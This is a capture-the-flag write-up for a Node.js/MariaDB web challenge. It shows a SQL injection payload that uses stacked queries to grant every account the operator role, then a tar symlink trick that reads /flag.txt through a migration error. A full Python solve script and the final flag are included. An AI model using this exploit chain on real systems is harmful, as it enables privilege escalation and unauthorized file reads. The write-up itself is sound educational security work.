## Forecast  

<img src="images/chall.png" width=600>

We are given a relatively small Node.js server that uses Drizzle ORM and MariaDB to handle user accounts.  

The admin endpoints require our account to have the `operator` role, but accounts are created with the `customer` role by default.  

```js
async function requireOperator(req, res, next) {
    const account = await authAccount(req)
    if (!account || account.role !== 'operator') {
        return res.status(401).json({ error: 'operator auth required' })
    }
    req.account = account
    next()
}

...

app.post('/signup', async (req, res) => {
    const { email, password } = req.body ?? {}
    if (typeof email !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'email and password required' })
    }
    if (email.length < 5 || password.length < 6) {
        return res.status(400).json({ error: 'email >=5, password >=6' })
    }
    try {
        const hash = await bcrypt.hash(password, 10)
        await conn.query(
            'INSERT INTO accounts (email, password_hash, role) VALUES (?, ?, ?)',
            [email, hash, 'customer']
        )
        res.json({ ok: true })
    } catch (e) {
        res.status(400).json({ error: String(e.message ?? e) })
    }
})

...

app.post('/admin/upload-release', requireOperator, upload.single('pack'), async (req, res) => {
    ...
})

app.post('/admin/deploy-release', requireOperator, async (req, res) => {
    ...
})
```

The Dockerfile shows that `flag.txt` is added in root, but since the server doesn't explicitly reference the flag file anywhere, we need to get RCE or a file read somehow.  

```dockerfile
FROM mariadb:11

ENV MARIADB_ROOT_PASSWORD=rootpw
ENV MARIADB_DATABASE=forecast
ENV MARIADB_USER=forecast
ENV MARIADB_PASSWORD=forecastpw

RUN apt-get update \
 && apt-get install -y --no-install-recommends curl ca-certificates \
 && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
 && apt-get install -y --no-install-recommends nodejs \
 && apt-get clean \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY package.json ./
RUN npm install --omit=dev

COPY index.js ./
COPY seed ./seed
COPY schema.sql /docker-entrypoint-initdb.d/001-schema.sql
COPY start.sh /usr/local/bin/start.sh
COPY flag.txt /flag.txt
RUN chmod +x /usr/local/bin/start.sh

RUN mkdir -p /srv/releases /srv/uploads

EXPOSE 3000
CMD ["/usr/local/bin/start.sh"]
```

In `/reports/run`, the only thing we can control is the `isolationLevel` parameter being passed into the query.  

Furthermore, the MySQL connection is created with `multipleStatements` set to `true`, allowing stacked queries, which is highly suspicious.  

```js
const conn = await mysql.createConnection({
    host: process.env.MYSQL_HOST,
    port: Number(process.env.MYSQL_PORT ?? 3306),
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DATABASE,
    multipleStatements: true,
})

...

app.post('/reports/run', requireAuth, async (req, res) => {
    const { consistency } = req.body ?? {}
    if (typeof consistency !== 'string') {
        return res.status(400).json({ error: 'consistency must be a string' })
    }

    try {
        await db.transaction(async (tx) => {
            await tx.execute(
                sql`INSERT INTO report_jobs (account_id, status) VALUES (${req.account.id}, 'queued')`
            )
        }, /** @type {any} */ ({ isolationLevel: consistency }))
    } catch (e) {
        return res.status(500).json({ error: String(e.message ?? e) })
    }
    res.json({ ok: true })
})
```

If we set `isolationLevel` to some SQLi payload like `' or 1--`, the server actually throws an error that shows we broke some query running under the hood.  

The error reveals that Drizzle is running a `SET` query using our `isolationLevel` without proper escaping, giving us SQLi.  

```js
{'error': "Failed query: set transaction isolation level ' or 1--'\nparams: "}
```

Remembering that we can run stacked queries, we can use a simple payload to grant all accounts the `operator` role, giving us access to the admin endpoints.  

```sql
READ COMMITTED; UPDATE accounts SET role='operator'; --
```

`/admin/upload-release` allows us to upload a TAR archive which will be extracted into `/srv/releases`. `/admin/deploy-release` will then treat `/srv/releases` as a migration bundle to perform a migration.  

```js
app.post('/admin/upload-release', requireOperator, upload.single('pack'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'attach release pack (tar.gz) as multipart field "pack"' })
    }
    try {
        await tar.x({ file: req.file.path, cwd: RELEASES_FOLDER })
        res.json({ ok: true })
    } catch (e) {
        res.status(500).json({ error: String(e.message ?? e) })
    } finally {
        try { fs.unlinkSync(req.file.path) } catch {}
    }
})

app.post('/admin/deploy-release', requireOperator, async (req, res) => {
    try {
        await migrate(db, { migrationsFolder: RELEASES_FOLDER })
        res.json({ ok: true })
    } catch (e) {
        res.status(500).json({ error: String(e.message ?? e) })
    }
})
```

Based on the simplicity of the admin endpoints, the vuln appears to be quite contrived and is most likely to be related to the `tar` library.  

`package.json` shows that `tar` is the only library which the server uses an outdated version of, confirming this theory.  

```json
{
  "name": "forecast",
  "private": true,
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "bcryptjs": "^2.4.3",
    "drizzle-orm": "0.45.2",
    "express": "^4.21.0",
    "multer": "1.4.5-lts.1",
    "mysql2": "^3.11.0",
    "tar": "^6.2.1"
  }
}
```

We can find a recently published [CVE-2026-23745](https://nvd.nist.gov/vuln/detail/cve-2026-23745), which explains that `node-tar` versions under `7.5.2` have a symlink poisoning exploit through absolute symlink targets.  

If we create a TAR archive containing a SQL file that has a symlink pointing to `/flag.txt`, `migrate()` in `/admin/deploy-release` will execute `/flag.txt` through the symlink, which will leak the flag through an error message.  

Below is my solve script for this challenge.  

```python
import io
import json
import tarfile
import time
import requests
import re
import os

url = 'http://host3.dreamhack.games:10875/'
s = requests.Session()

# login
creds = {
    'email': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/signup', json=creds)
res = s.post(f'{url}/login', json=creds)

assert 'token' in res.json()
print("> Logged in")

token = res.json()['token']

s.headers.update({
    'Authorization': f'Bearer {token}'
})

# get admin
res = s.post(f'{url}/reports/run', json={
    'consistency': "READ COMMITTED; UPDATE accounts SET role='operator'; --"
})

assert res.json()['ok']
print("> Escalated to admin")

# symlink leak
def build_journal(tag: str, idx: int = 0) -> bytes:
    journal = {
        "version": "5",
        "dialect": "mysql",
        "entries": [
            {
                "idx": idx,
                "version": "5",
                "when": int(time.time() * 1000),
                "tag": tag,
                "breakpoints": True,
            }
        ],
    }
    return json.dumps(journal, indent=2).encode()

def add_bytes(tar: tarfile.TarFile, arcname: str, data: bytes):
    info = tarfile.TarInfo(name=arcname)
    info.size = len(data)
    info.mtime = int(time.time())
    tar.addfile(info, io.BytesIO(data))

def add_symlink(tar: tarfile.TarFile, arcname: str, linkname: str):
    info = tarfile.TarInfo(name=arcname)
    info.type = tarfile.SYMTYPE
    info.linkname = linkname
    info.mtime = int(time.time())
    tar.addfile(info)

journal_bytes = build_journal('payload', 0)

payload_file = 'payload.tar.gz'

with tarfile.open(payload_file, "w:gz") as tar:
    add_bytes(tar, "meta/_journal.json", journal_bytes)
    add_symlink(tar, 'payload.sql', '/flag.txt')

with open(payload_file, 'rb') as f:
    payload = f.read()

res = s.post(f'{url}/admin/upload-release', files={
    'pack': (payload_file, payload, 'application/zip')
})

assert res.json()['ok']
print("> Uploaded payload")

os.remove(payload_file)

# get flag
res = s.post(f'{url}/admin/deploy-release')

flag = re.findall(r'DH{.+?}', res.text)[0].strip()
print("Flag:", flag)
```

Flag: `DH{K3pXm9vQ2rT8nJyL5wHb4FcZsA7gPdM6eR1uVqN0xBiYoCk:rGKXT202fC2XHssIFITTzA==}`